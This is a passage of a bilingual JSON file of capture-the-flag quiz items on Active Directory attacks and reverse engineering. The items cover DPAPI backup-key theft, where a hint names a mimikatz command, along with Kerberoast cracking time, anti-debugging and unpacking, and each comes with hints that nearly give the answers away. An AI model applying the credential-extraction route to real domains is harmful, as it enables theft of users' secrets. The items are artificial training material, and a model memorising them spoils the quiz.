      ]
    }
  },
  {
    "id": "t4_addpapi",
    "tier": 4,
    "cat": "lateral",
    "track": "adattack",
    "points": 160,
    "ci": true,
    "hash": "c00a959ff9006e1d1f9216ea904de806420b52922cf3045bdaa7c31d92728640",
    "fmt": "약어 / acronym (5글자 / 5 chars)",
    "title": {
      "ko": "도메인이 쥔 만능 복호화 키",
      "en": "The Domain-Held Master Decryption Key"
    },
    "prompt": {
      "ko": "윈도우가 저장된 브라우저 비밀번호, RDP 자격 증명, 무선 키 등을 사용자별로 암호화하는 데 쓰는 데이터 보호 API. 도메인 환경에서는 DC 가 백업 마스터 키를 갖고 있어, 그것을 뽑으면 도메인 내 어떤 사용자의 보호된 비밀도 복호화할 수 있다. 이 API 의 다섯 글자 약어는?",
      "en": "The Windows data-protection API used to encrypt, per user, saved browser passwords, RDP logins, Wi-Fi keys and more. On a domain the DC holds a backup master key; extract it and you can decrypt any domain user's protected secrets. Give the five-letter acronym."
    },
    "hints": {
      "ko": [
        "\"Data Protection API\".",
        "mimikatz `lsadump::backupkeys`, SharpDPAPI."
      ],
      "en": [
        "\"Data Protection API\".",
        "mimikatz `lsadump::backupkeys`, SharpDPAPI."
      ]
    }
  },
  {
    "id": "t4_adcapstone",
    "tier": 4,
    "cat": "kerberos",
    "track": "adattack",
    "points": 250,
    "ci": false,
    "hash": "fb1ff02dfa287774aae03427db13d12d84f95f7e0028d63b009ad2421f523054",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "로스팅 캡스톤",
      "en": "Roasting Capstone"
    },
    "prompt": {
      "ko": "아래는 로스팅 작전 브리핑이다. (1) RC4 서비스 티켓 하나의 전체 키 공간을 소진하는 최악의 시간(초)을 `floor(keyspace / (hashcat_rate × 10^6))` 로 구한다. (2) `paths_to_da` 에 나열된, 도메인 관리자까지 경로가 열리는 크랙된 계정 수를 센다. `FLAG{KEYSEC_<초>_DA_<수>}` 를 제출하라.\n\n```\nrc4_hash_count: 5\nhashcat_rate: 4500          (MH/s, mode 13100)\nkeyspace: 2^42\npaths_to_da: svc_backup, svc_adm\n```",
      "en": "Below is a roasting-operation brief. (1) Work out the worst-case time in seconds to exhaust the whole key space of one RC4 service ticket as `floor(keyspace / (hashcat_rate * 10^6))`. (2) Count the cracked accounts listed in `paths_to_da` that open a path to Domain Admin. Submit `FLAG{KEYSEC_<seconds>_DA_<count>}`.\n\n```\nrc4_hash_count: 5\nhashcat_rate: 4500          (MH/s, mode 13100)\nkeyspace: 2^42\npaths_to_da: svc_backup, svc_adm\n```"
    },
    "hints": {
      "ko": [
        "2^42 = 4398046511104. 4500 MH/s = 4.5×10^9 h/s. 4398046511104 / 4.5e9 = 977.3… → 977.",
        "paths_to_da 목록에는 계정이 둘. 그래서 뒷자리는 2."
      ],
      "en": [
        "2^42 = 4398046511104. 4500 MH/s = 4.5e9 h/s. 4398046511104 / 4.5e9 = 977.3… → 977.",
        "paths_to_da lists two accounts, so the trailing number is 2."
      ]
    }
  }
,
  {
    "id": "t0_reupx",
    "tier": 0,
    "cat": "unpack",
    "track": "revadv",
    "points": 50,
    "ci": true,
    "hash": "7f196630cc8f69902d7370f94978deda7808b8a4c9a249cba8307cff9bb8ad7d",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "상자에 넣었다 꺼내기",
      "en": "Boxed and Unboxed"
    },
    "prompt": {
      "ko": "실행 파일을 압축해 크기를 줄이고 읽을 수 있는 텍스트와 임포트를 한눈에 안 보이게 하는, 가장 흔한 오픈소스 실행 압축기가 있다. 원본으로 되돌리는 `-d` 옵션도 자체적으로 제공한다. 이 도구의 세 글자 이름은?",
      "en": "The most common open-source executable compressor: it shrinks a binary and hides its readable text and imports from a casual look, and it ships its own `-d` switch to reverse the process. Give its three-letter name."
    },
    "hints": {
      "ko": [
        "\"Ultimate Packer for eXecutables\".",
        "`-d` 플래그로 그대로 풀린다 — 커스텀 스터브가 아니라면."
      ],
      "en": [
        "\"Ultimate Packer for eXecutables\".",
        "The `-d` flag reverses it cleanly unless the stub was tampered with."
      ]
    }
  },
  {
    "id": "t0_reidb",
    "tier": 0,
    "cat": "antidbg",
    "track": "revadv",
    "points": 50,
    "ci": true,
    "hash": "baaa7edbcb7edf9ae6f09c6761a5251357fa634275a54baf95698472c8bfd4c1",
    "fmt": "한 단어 / one word (17글자 / 17 chars)",
    "title": {
      "ko": "나 지금 감시당해?",
      "en": "Am I Being Watched?"
    },
    "prompt": {
      "ko": "가장 단순한 안티디버깅 검사다. 프로그램이 이 kernel32 API 를 호출하면, 현재 프로세스에 디버거가 붙어 있을 때 0 이 아닌 값이 돌아온다. 낙타표기(CamelCase)로 된 이 함수 이름은?",
      "en": "The simplest anti-debugging check of all: the program calls this one kernel32 API and gets a non-zero result whenever a debugger is attached to the current process. Give the CamelCase function name."
    },
    "hints": {
      "ko": [
        "이름 그대로 영어 문장처럼 읽힌다 — \"…디버거…있음\".",
        "내부적으로는 프로세스 구조체의 한 바이트를 그대로 읽어 돌려줄 뿐이다."
      ],
      "en": [
        "The name reads like the English question it asks.",
        "Internally it just returns one byte read straight out of a process structure."
      ]
    }
  },
  {
    "id": "t1_rerdtsc",
    "tier": 1,
    "cat": "antidbg",
    "track": "revadv",
    "points": 65,
    "ci": true,
    "hash": "eb2de26967fef49abafd3ef18fee17918a4bbf4987b53e862ad3cf0d10f1c372",
    "fmt": "한 단어 / one word (5글자 / 5 chars)",
    "title": {
      "ko": "시계를 두 번 본다",
      "en": "Reading the Clock Twice"
    },
    "prompt": {
      "ko": "API 를 전혀 부르지 않는 타이밍 기반 디버거 탐지. 이 x86 명령을 두 번 실행해 그 사이에 흐른 CPU 사이클 수를 재고, 값이 비정상적으로 크면 사람이 한 줄씩 스텝 실행 중이라고 판단한다. 이 명령의 니모닉은?",
      "en": "A timing-based debugger check that calls no API at all: run this x86 instruction twice, measure the CPU cycles elapsed between the two reads, and if the gap is abnormally large conclude a human is single-stepping. Give the instruction mnemonic."
    },
    "hints": {
      "ko": [
        "\"Read Time-Stamp Counter\". 결과는 EDX:EAX 에 담긴다.",
        "더 정확한 직렬화 변종은 뒤에 P 가 붙는다."
      ],
      "en": [
        "\"Read Time-Stamp Counter\"; the result lands in EDX:EAX.",
        "The serializing variant adds a trailing P."
      ]
    }
  },
  {
    "id": "t1_repeb",
    "tier": 1,
    "cat": "antidbg",
    "track": "revadv",
    "points": 65,
    "ci": true,
    "hash": "e836ed483041befd5394167dcab06c61b93afff6bfe4c7cf312b75ff1482e083",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "API 를 건너뛰고 직접 읽기",
      "en": "Skipping the API"
    },
    "prompt": {
      "ko": "후킹된 API 를 우회하려고, 안티디버깅 코드는 문서화된 함수 대신 프로세스마다 존재하는 이 구조체의 `BeingDebugged` 바이트(오프셋 2)를 fs:[0x30] / gs:[0x60] 을 통해 직접 읽는다. 이 구조체의 세 글자 약어는?",
      "en": "To dodge a hooked API, anti-debug code skips the documented function and reads the `BeingDebugged` byte (offset 2) straight out of this per-process structure via fs:[0x30] / gs:[0x60]. Give its three-letter acronym."
    },
    "hints": {
      "ko": [
        "\"Process Environment Block\".",
        "TEB 안의 포인터를 따라가면 나온다."
      ],
      "en": [
        "\"Process Environment Block\".",
        "Reached by following a pointer inside the TEB."
      ]
    }
  },
  {
    "id": "t1_reoep",
    "tier": 1,
    "cat": "unpack",
    "track": "revadv",
    "points": 65,
    "ci": true,
    "hash": "58bb894930d137ea1fd027e329a49d4ce6051fdc77e7db1ad25a5c20c0688230",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "진짜 시작점",
      "en": "Where It Really Starts"
    },
    "prompt": {
      "ko": "패커의 스터브가 원본 코드를 메모리에 풀어 놓은 뒤, 실행은 프로그램이 원래 시작하던 그 주소로 점프한다. 언패킹의 목표 지점인 이 \"원래 진입점\"을 가리키는 세 글자 약어는?",
      "en": "After a packer stub has unpacked the original code into memory, execution jumps to the address where the program was always meant to begin. Give the three-letter acronym for that original entry point — the goal of any unpack."
    },
    "hints": {
      "ko": [
        "\"Original Entry Point\".",
        "스터브 끝의 꼬리 점프(tail jump)가 대개 여기로 향한다."
      ],
      "en": [
        "\"Original Entry Point\".",
        "The stub's tail jump usually lands right on it."
      ]
    }
  },
  {
    "id": "t1_redie",
    "tier": 1,
    "cat": "unpack",
    "track": "revadv",
    "points": 65,
    "ci": true,
    "hash": "a8d79f40ddb79de569d778f1c0b832f9cc266b32274b702cff4ba2b8a0dd1549",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "무엇으로 만들었나",
      "en": "What Built This"
    },
    "prompt": {
      "ko": "뭔가를 풀기 전에 먼저 지문을 뜬다 — 이 파일은 어떤 컴파일러나 패커가 만들었나? PEiD 의 오픈소스 후계 격으로, 시그니처와 휴리스틱으로 이 질문에 답하는 도구의 세 글자 약칭은?",
      "en": "Before you unpack anything you fingerprint the file: which compiler or packer produced it? Give the three-letter short name of the open-source successor to PEiD that answers this with signatures and heuristics."
    },
    "hints": {
      "ko": [
        "\"Detect It Easy\". GUI 와 CLI(diec) 를 모두 제공한다.",
        "규칙은 커스텀 스크립트 언어로 쓰여 있다."
      ],
      "en": [
        "\"Detect It Easy\"; ships both a GUI and a CLI (diec).",
        "Its rules are written in a small custom scripting language."
      ]
    }
  },
  {
    "id": "t1_reangr",
    "tier": 1,
    "cat": "symbolic",
    "track": "revadv",
    "points": 65,
    "ci": true,
    "hash": "055e06e69658ef5d1a8e43593368ffadb2a5cd50bca32e7e09b1943595eaaaa1",
    "fmt": "도구 이름 / tool name (4글자 / 4 chars)",
    "title": {
      "ko": "모든 경로를 한꺼번에",
      "en": "Every Path at Once"
    },
    "prompt": {
      "ko": "VEX IR 과 Claripy 솔버 위에 세워진, 가장 널리 쓰이는 오픈소스 파이썬 심볼릭 실행 프레임워크. 입력을 구체적인 값이 아니라 기호 변수로 두고 분기마다 상태를 갈라 목표 지점에 도달하는 입력을 풀어낸다. 이 프레임워크의 이름은?",
      "en": "The most widely used open-source Python symbolic-execution framework, built on the VEX IR and the Claripy solver: it keeps input as symbolic variables rather than concrete values, forks state at each branch, and solves for an input that reaches a target. Name it."
    },
    "hints": {
      "ko": [
        "소문자 네 글자, 발음은 \"앵거\".",
        "Shellphish 팀(UC Santa Barbara)이 만들었다."
      ],
      "en": [
        "Four lowercase letters, said \"anger\".",
        "Built by the Shellphish team at UC Santa Barbara."
      ]
    }
  },
  {
    "id": "t1_recfg",
    "tier": 1,
    "cat": "binary",
    "track": "revadv",
    "points": 65,
    "ci": true,
    "hash": "e67d23e7820c49a8051dac2831f38290f5e72f66c8db5079eeb60d82f14894c0",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "블록과 화살표",
      "en": "Blocks and Arrows"
    },
    "prompt": {
      "ko": "디스어셈블러가 그리는 그래프다. 노드는 한 진입·한 탈출을 가진 명령 묶음(기본 블록)이고, 엣지는 그 사이의 분기와 점프다. 함수의 구조를 한눈에 보게 해 주는 이 그래프의 세 글자 약어는?",
      "en": "The graph a disassembler draws: nodes are straight-line instruction runs with one entry and one exit (basic blocks), edges are the branches and jumps between them. It lays a function's structure out at a glance. Give the three-letter acronym."
    },
    "hints": {
      "ko": [
        "\"Control Flow Graph\".",
        "엣지 수 − 노드 수 + 2 로 이 그래프의 복잡도를 잰다."
      ],
      "en": [
        "\"Control Flow Graph\".",
        "Edges − nodes + 2 measures this graph's complexity."
      ]
    }
  },
  {
    "id": "t2_reint3",
    "tier": 2,
    "cat": "antidbg",
    "track": "revadv",
    "points": 90,
    "ci": true,
    "hash": "c57cb8dbe2abdb37124ab9fe9ad3a564b4538f4c6ae1ad56309480a594cc46f7",
    "fmt": "한 단어 / one word (4글자 / 4 chars)",
    "title": {
      "ko": "한 바이트짜리 함정",
      "en": "A One-Byte Trap"
    },
    "prompt": {
      "ko": "소프트웨어 브레이크포인트를 걸면 디버거가 원래 명령의 첫 바이트를 옵코드 0xCC 로 덮어쓴다. 안티디버깅 코드는 자기 코드 영역에 이 바이트가 있는지 스캔해 브레이크포인트를 찾아낸다. 0xCC 에 해당하는 명령 니모닉을 공백 없이 쓰면?",
      "en": "Setting a software breakpoint makes the debugger overwrite the first byte of the target instruction with opcode 0xCC. Anti-debug code scans its own code section for that byte to spot breakpoints. Write the instruction mnemonic for 0xCC with no space."
    },
    "hints": {
      "ko": [
        "3 번 인터럽트를 부르는 한 바이트 명령이다.",
        "두 바이트 형태 `CD 03` 도 있지만 디버거는 한 바이트짜리를 쓴다."
      ],
      "en": [
        "The one-byte instruction that raises interrupt 3.",
        "A two-byte form `CD 03` exists, but debuggers use the one-byte one."
      ]
    }
  },
  {
    "id": "t2_resmt",
    "tier": 2,
    "cat": "symbolic",
    "track": "revadv",
    "points": 90,
    "ci": true,
    "hash": "43ea6d6889cf4170260fbd156aa5f48e96af615a2065112fbbf48b0e65cad5dd",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "식을 풀어 주는 엔진",
      "en": "The Engine That Solves"
    },
    "prompt": {
      "ko": "심볼릭 실행이 경로를 따라 모은 제약식(부등식·비트벡터·배열)을 넘겨 \"이 식을 만족하는 값이 있는가, 있다면 무엇인가\"를 답해 주는 솔버 종류. 순수 불리언 SAT 를 정수·비트벡터 이론으로 확장한 이것의 세 글자 약어는?",
      "en": "Symbolic execution hands the constraints it gathered along a path (inequalities, bit-vectors, arrays) to this kind of solver, which answers \"is there a satisfying assignment, and what is it?\". It extends pure boolean SAT with theories like integers and bit-vectors. Give the three-letter acronym."
    },
    "hints": {
      "ko": [
        "\"Satisfiability Modulo Theories\".",
        "CVC5·Bitwuzla 가 대표적인 구현이다."
      ],
      "en": [
        "\"Satisfiability Modulo Theories\".",
        "CVC5 and Bitwuzla are well-known implementations."
      ]
    }
  },
  {
    "id": "t2_repathexpl",
    "tier": 2,
    "cat": "symbolic",
    "track": "revadv",
    "points": 90,
    "ci": true,
    "hash": "a8a67c860f634e13312a7de48355390444b64de8b58bd31a763601f6c7dc848e",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "갈라지고 또 갈라지고",
      "en": "Fork After Fork"
    },
    "prompt": {
      "ko": "심볼릭 실행의 근본적인 확장성 문제. 분기를 만날 때마다 상태가 둘로 갈라지므로, 탐색해야 할 경로 수가 코드의 분기 개수에 대해 지수적으로 늘어난다. 루프와 중첩 조건이 이를 폭발시킨다. 이 현상을 부르는 두 단어는?",
      "en": "The fundamental scalability problem of symbolic execution: every branch forks the state in two, so the number of paths to explore grows exponentially with the branch count, and loops and nested conditions blow it up. What two words name this?"
    },
    "hints": {
      "ko": [
        "첫 단어는 \"경로\", 둘째 단어는 \"폭발\".",
        "병합(state merging)·요약·가지치기가 완화 기법이다."
      ],
      "en": [
        "First word \"path\", second word \"explosion\".",
        "State merging, summaries and pruning are the mitigations."
      ]
    }
  },
  {
    "id": "t2_reunsat",
    "tier": 2,
    "cat": "symbolic",
    "track": "revadv",
    "points": 90,
    "ci": true,
    "hash": "af3a14c11c198ad9e92ed4a8f341a59e2602c0e1088144f05f0a6607d3cac3c1",
    "fmt": "한 단어 / one word (5글자 / 5 chars)",
    "title": {
      "ko": "갈 수 없는 길",
      "en": "A Road You Cannot Take"
    },
    "prompt": {
      "ko": "솔버에게 현재 경로의 제약식을 넘겼더니 \"이 조건을 모두 만족하는 입력은 존재하지 않는다\"는 판정이 돌아왔다. 그 경로는 실제로 실행될 수 없으므로 탐색에서 버린다. 이 판정을 가리키는 솔버 용어(한 단어)는?",
      "en": "You hand the solver the constraints for the current path and it reports back that no input can satisfy all of them at once. That path can never actually run, so you drop it from the search. Give the one-word solver verdict."
    },
    "hints": {
      "ko": [
        "반대 판정은 \"sat\".",
        "\"unsatisfiable\" 의 줄임말."
      ],
      "en": [
        "The opposite verdict is \"sat\".",
        "Short for \"unsatisfiable\"."
      ]
    }
  },
  {
    "id": "t2_reiat",
    "tier": 2,
    "cat": "unpack",
    "track": "revadv",
    "points": 90,
    "ci": true,
    "hash": "3df05ba6053db552571d26c662c79f7363a804a352f6e0187c1d9a9382cdbaae",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "메모리에서 뜬 뒤 고쳐야 할 표",
      "en": "The Table to Rebuild After Dumping"
    },
    "prompt": {
      "ko": "언패킹된 프로세스를 메모리에서 통째로 덤프하면 코드는 살아나지만, API 호출이 향하는 이 포인터 표는 로더가 채워 넣은 런타임 주소들이라 파일에 그대로 담기지 않는다. 전용 임포트 복원 도구로 재구성해야 한다. 이 표의 세 글자 약어는?",
      "en": "Dump an unpacked process straight out of memory and the code is intact, but the pointer table that API calls jump through holds runtime addresses the loader filled in, so it does not survive to the file. You rebuild it with a dedicated import-fixing tool. Give its three-letter acronym."
    },
    "hints": {
      "ko": [
        "\"Import Address Table\".",
        "INT(이름 표)와 짝을 이룬다."
      ],
      "en": [
        "\"Import Address Table\".",
        "Paired with the INT (name table)."
      ]
    }
  },
  {
    "id": "t2_reopaque",
    "tier": 2,
    "cat": "binary",
    "track": "revadv",
    "points": 90,
    "ci": true,
    "hash": "fa38098b383ea16075a856def30090a539a229ca434a8c3098f5f98f5cfe2677",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "늘 참인 거짓 갈림길",
      "en": "A Branch That Never Branches"
    },
    "prompt": {
      "ko": "난독화가 삽입하는 조건식. 실행 시점에는 항상 같은 결과가 나오지만(예: `7*x*x - 1` 은 절대 완전제곱수가 아님) 정적 분석기는 그 사실을 모르므로, 도달 불가능한 죽은 가지가 제어 흐름 그래프에 잔뜩 생겨 분석을 어지럽힌다. 이 조건식을 부르는 두 단어는?",
      "en": "A predicate obfuscation inserts whose outcome is always the same at run time (e.g. `7*x*x - 1` is never a perfect square) but which a static analyzer cannot prove, so the control-flow graph fills with unreachable dead branches that clutter analysis. What two words name it?"
    },
    "hints": {
      "ko": [
        "첫 단어는 \"속이 안 보이는\", 둘째 단어는 조건식.",
        "기호 실행이나 제약 솔버로 \"이 가지는 죽었다\"를 증명해 제거한다."
      ],
      "en": [
        "First word \"you cannot see through it\", second word is a conditional expression.",
        "Symbolic execution or a constraint-solver query proves the branch dead and removes it."
      ]
    }
  },
  {
    "id": "t2_reshannon",
    "tier": 2,
    "cat": "unpack",
    "track": "revadv",
    "points": 150,
    "ci": false,
    "hash": "c868ef7e06d4c82baa922cb8f569fc354b9564eb44d873bae0bd6ce23491d7a8",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "무작위도 재기",
      "en": "Measuring Randomness"
    },
    "prompt": {
      "ko": "아래 히스토그램은 어느 PE 섹션의 바이트 값 빈도다. 이 분포의 섀넌 정보량을 바이트당 비트로 계산하라(H = −Σ pᵢ·log₂ pᵢ). 소수점 둘째 자리까지 반올림한 값 x 로 `FLAG{H_<x>}` 를 제출하라 (예: `FLAG{H_3.00}`).\n\n```\nhistogram:\n0x41: 8\n0x42: 4\n0x43: 2\n0x44: 2\n```",
      "en": "The histogram below is the byte-value frequency of some PE section. Compute the Shannon information content of this distribution in bits per byte (H = −Σ pᵢ·log₂ pᵢ). Submit `FLAG{H_<x>}` with x rounded to two decimals (e.g. `FLAG{H_3.00}`).\n\n```\nhistogram:\n0x41: 8\n0x42: 4\n0x43: 2\n0x44: 2\n```"
    },
    "hints": {
      "ko": [
        "총 16 바이트. p = 1/2, 1/4, 1/8, 1/8.",
        "1/2·1 + 1/4·2 + 1/8·3 + 1/8·3."
      ],
      "en": [
        "16 bytes total; p = 1/2, 1/4, 1/8, 1/8.",
        "1/2·1 + 1/4·2 + 1/8·3 + 1/8·3."
      ]
    }
  },
  {
    "id": "t2_rexorkey",
    "tier": 2,
    "cat": "unpack",
    "track": "revadv",
    "points": 150,
    "ci": false,
    "hash": "d15ae5a5a47da40dcb6e5fd2b1da9cd01e0c861736644d56b22b312814aae100",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "알려진 머리로 열쇠 찾기",
      "en": "Key From a Known Head"
    },
    "prompt": {
      "ko": "스터브가 페이로드를 한 바이트 XOR 로 가려 놓았다. 풀린 페이로드는 PE 파일이므로 첫 두 바이트가 0x4D 0x5A 여야 한다. 아래 암호문 앞부분과 알려진 평문 앞부분(`known_prefix_hex`)으로 단일 바이트 키를 복구해 대문자 두 자리 16진수 KK 로 `FLAG{XORKEY_<KK>}` 를 제출하라.\n\n```\ncipher_hex: 17 00 ca 5a 3d\nknown_prefix_hex: 4d 5a\n```",
      "en": "A stub masks its payload with a single-byte XOR. The decrypted payload is a PE file, so its first two bytes must be 0x4D 0x5A. Recover the one-byte key from the ciphertext head and the known plaintext head (`known_prefix_hex`) below, and submit `FLAG{XORKEY_<KK>}` with KK as two uppercase hex digits.\n\n```\ncipher_hex: 17 00 ca 5a 3d\nknown_prefix_hex: 4d 5a\n```"
    },
    "hints": {
      "ko": [
        "0x17 XOR 0x4D = ?",
        "두 번째 바이트로도 같은 키가 나오는지 확인: 0x00 XOR 0x5A."
      ],
      "en": [
        "0x17 XOR 0x4D = ?",
        "Check the second byte gives the same key: 0x00 XOR 0x5A."
      ]
    }
  },
  {
    "id": "t3_renanomites",
    "tier": 3,
    "cat": "antidbg",
    "track": "revadv",
    "points": 130,
    "ci": true,
    "hash": "4a8205c46080ba12af61485632c6aca0c8f2b59649da72e72645e209db3762d7",
    "fmt": "한 단어 / one word (9글자 / 9 chars)",
    "title": {
      "ko": "디버거가 있어야 실행되는 코드",
      "en": "Code That Needs a Debugger to Run"
    },
    "prompt": {
      "ko": "Armadillo 보호기의 대표 기법. 분기 명령들을 0xCC 한 바이트로 바꿔 놓고, 그 자리에 오면 발생하는 예외를 별도의 디버거 스레드가 잡아 원래 점프 목적지와 크기를 테이블에서 찾아 처리한다. 디버거를 떼면 프로그램이 망가진다. 이 기법의 이름(한 단어)은?",
      "en": "Armadillo's signature trick: replace branch instructions with opcode 0xCC, and when execution hits one, a dedicated debugger thread catches the exception and looks the real jump target and size up in a table. Detach the debugger and the program breaks. Give the one-word name."
    },
    "hints": {
      "ko": [
        "\"nano\" + \"mites\" — 아주 작은 조각들.",
        "언패킹하려면 그 테이블을 통째로 덤프해 분기들을 복원해야 한다."
      ],
      "en": [
        "\"nano\" + \"mites\" — tiny fragments.",
        "Unpacking means dumping that whole table and restoring the branches."
      ]
    }
  },
  {
    "id": "t3_rentglobalflag",
    "tier": 3,
    "cat": "antidbg",
    "track": "revadv",
    "points": 130,
    "ci": true,
    "hash": "b91756826b562c1f5b5f31eb894c43897ba5a370fc38b5b7a619523a5c59f019",
    "fmt": "한 단어 / one word (12글자 / 12 chars)",
    "title": {
      "ko": "BeingDebugged 옆의 또 다른 밀고자",
      "en": "The Tell Next to BeingDebugged"
    },
    "prompt": {
      "ko": "같은 프로세스 구조체 안, `BeingDebugged` 근처(32비트에서 오프셋 0x68)에 있는 필드. 디버거가 프로세스를 띄우면 힙 검증·꼬리 검사·프리 검사에 해당하는 비트들이 켜져 값이 0x70 이 된다. 낙타표기로 된 이 필드 이름은?",
      "en": "A field in the same process structure as `BeingDebugged`, near it (offset 0x68 on 32-bit). When a debugger launches the process, the bits for heap tail-checking, free-checking and validation switch on and the value becomes 0x70. Give the CamelCase field name."
    },
    "hints": {
      "ko": [
        "\"Nt\" + \"Global\" + \"Flag\".",
        "HKLM\\...\\Image File Execution Options 의 GlobalFlag 레지스트리 값과 대응된다."
      ],
      "en": [
        "\"Nt\" + \"Global\" + \"Flag\".",
        "Mirrors the GlobalFlag registry value under Image File Execution Options."
      ]
    }
  },
  {
    "id": "t3_reptrace",
    "tier": 3,
    "cat": "antidbg",
    "track": "revadv",
    "points": 130,
    "ci": true,
    "hash": "160ec8e507f2527b4de8f753c43de80b5aca90d0918e709d88c5519d6b122e34",
    "fmt": "시스템 콜 / syscall",
    "title": {
      "ko": "먼저 나를 추적하기",
      "en": "Trace Myself First"
    },
    "prompt": {
      "ko": "리눅스에서 한 프로세스는 오직 하나의 추적자만 가질 수 있다. 그래서 안티디버깅 바이너리는 시작하자마자 `PTRACE_TRACEME` 인자로 자기 자신에게 이 시스템 콜을 걸어 추적자 자리를 미리 차지한다 — 이후 디버거가 이 프로세스를 추적하려 하면 실패한다. 이 시스템 콜의 이름은?",
      "en": "On Linux a process can have only one tracer. So an anti-debug binary calls this syscall on itself with `PTRACE_TRACEME` the moment it starts, claiming the tracer slot up front — any debugger that later tries to trace the process then fails. Name the syscall."
    },
    "hints": {
      "ko": [
        "디버거와 시스템 콜 트레이서가 뒤에서 쓰는 바로 그 시스템 콜.",
        "getppid 로 부모가 디버거인지 보는 변종도 흔하다."
      ],
      "en": [
        "The very syscall a debugger and a syscall tracer use under the hood.",
        "A getppid variant that checks whether the parent is a debugger is also common."
      ]
    }
  },
  {
    "id": "t3_rez3",
    "tier": 3,
    "cat": "symbolic",
    "track": "revadv",
    "points": 130,
    "ci": true,
    "hash": "47d1607efc92e4e3b765be65c7ec2ac063524455d36ae201aec7cccd4a6e431e",
    "fmt": "도구 이름 / tool name (2글자 / 2 chars)",
    "title": {
      "ko": "레드먼드에서 온 솔버",
      "en": "The Solver from Redmond"
    },
    "prompt": {
      "ko": "대표 심볼릭 실행 엔진이 경로 제약을 넘길 때 기본으로 쓰는, 마이크로소프트 리서치가 만든 오픈소스 솔버. 이름은 알파벳 한 글자와 숫자 한 개로 되어 있다. 이 솔버의 이름은?",
      "en": "The open-source solver from Microsoft Research that the leading symbolic-execution engine uses by default to discharge its path constraints. Its name is one letter and one digit. Name it."
    },
    "hints": {
      "ko": [
        "\"Z\" 다음에 숫자 하나.",
        "Leonardo de Moura 와 Nikolaj Bjørner 가 만들었다."
      ],
      "en": [
        "\"Z\" followed by a single digit.",
        "Built by Leonardo de Moura and Nikolaj Bjørner."
      ]
    }
  },
  {
    "id": "t3_reconcolic",
    "tier": 3,
    "cat": "symbolic",
    "track": "revadv",
    "points": 130,
    "ci": true,
    "hash": "90362ee44786fecb70f23e56c420ab7919bfe0442160eb7b78b7556da1713b25",
    "fmt": "한 단어 / one word (8글자 / 8 chars)",
    "title": {
      "ko": "구체와 기호를 함께",
      "en": "Concrete and Symbolic Together"
    },
    "prompt": {
      "ko": "순수 심볼릭 실행이 경로 수 폭증과 모델링 불가능한 호출에 막힐 때 쓰는 절충. 실제 구체 입력으로 프로그램을 돌리면서 동시에 심볼릭 제약을 모으고, 막다른 곳에서는 구체 값으로 대체해 진행한다. \"concrete\" 와 \"symbolic\" 을 합친 이 한 단어는?",
      "en": "The compromise used when pure symbolic execution stalls on the blow-up of paths or un-modelable calls: run the program on a real concrete input while gathering symbolic constraints alongside, and fall back to concrete values where you get stuck. Give the one-word blend of \"concrete\" and \"symbolic\"."
    },
    "hints": {
      "ko": [
        "앞은 \"conc\", 뒤는 \"olic\".",
        "DART 와 SAGE 가 이 방식을 대중화했다."
      ],
      "en": [
        "Starts \"conc\", ends \"olic\".",
        "DART and SAGE popularized it."
      ]
    }
  },
  {
    "id": "t3_rescylla",
    "tier": 3,
    "cat": "unpack",
    "track": "revadv",
    "points": 130,
    "ci": true,
    "hash": "ada35511800414771968518262225a95a7d92a913d21c462eacd40e5b29356cc",
    "fmt": "도구 이름 / tool name (6글자 / 6 chars)",
    "title": {
      "ko": "덤프하고 임포트를 되살리는 도구",
      "en": "Dump, Then Revive the Imports"
    },
    "prompt": {
      "ko": "x64dbg 의 플러그인(그리고 독립 실행 버전)으로, 실행이 원래 진입점에 도달한 순간 프로세스 메모리를 덤프하고 임포트 주소 표를 스캔·재구성해 다시 실행 가능한 PE 로 만들어 준다. ImpREC 의 현대적 대체품인 이 도구의 이름은?",
      "en": "An x64dbg plugin (and standalone) that dumps process memory the moment execution reaches the original entry point, then scans and rebuilds the import address table into a runnable PE again. The modern replacement for ImpREC. Name it."
    },
    "hints": {
      "ko": [
        "그리스 신화의 바다 괴물 이름.",
        "x64dbg 메뉴에서 Plugins → 이 이름 으로 연다."
      ],
      "en": [
        "Named after the sea monster of Greek myth.",
        "Opened from x64dbg under Plugins → this name."
      ]
    }
  },
  {
    "id": "t3_rebindiff",
    "tier": 3,
    "cat": "binary",
    "track": "revadv",
    "points": 130,
    "ci": true,
    "hash": "187a0ae8ae7b43389a10c68b99586cea71c48dd3dfcd554fbb1de2d3358ec0b8",
    "fmt": "도구 이름 / tool name (7글자 / 7 chars)",
    "title": {
      "ko": "두 버전을 나란히",
      "en": "Two Versions Side by Side"
    },
    "prompt": {
      "ko": "패치된 바이너리와 패치 전 바이너리의 함수들을 그래프 동형·기본 블록·호출 관계로 매칭해, 조용히 고쳐진 함수 하나를 짚어 준다. 패치 데이(N-day) 분석의 표준 도구로, 원래 zynamics 가 만들었고 지금은 구글이 무료 배포한다. 이 도구의 이름은?",
      "en": "Matches functions between a patched binary and its pre-patch version by graph isomorphism, basic blocks and call relations, pointing straight at the one function that was quietly fixed. The standard tool for patch-day (N-day) analysis, originally by zynamics, now free from Google. Name it."
    },
    "hints": {
      "ko": [
        "\"Bin\" + \"Diff\".",
        "BinExport 로 뽑은 .BinExport 두 개를 비교한다. Diaphora 는 오픈소스 대안."
      ],
      "en": [
        "\"Bin\" + \"Diff\".",
        "Compares two .BinExport files from BinExport; Diaphora is the open-source alternative."
      ]
    }
  },
  {
    "id": "t3_retaint",
    "tier": 3,
    "cat": "binary",
    "track": "revadv",
    "points": 130,
    "ci": true,
    "hash": "fa98300cb837a85a162a55ca501c9142499a8133ea52be35be508fffbe6a868b",
    "fmt": "한 단어 / one word (5글자 / 5 chars)",
    "title": {
      "ko": "오염을 따라간다",
      "en": "Following the Stain"
    },
    "prompt": {
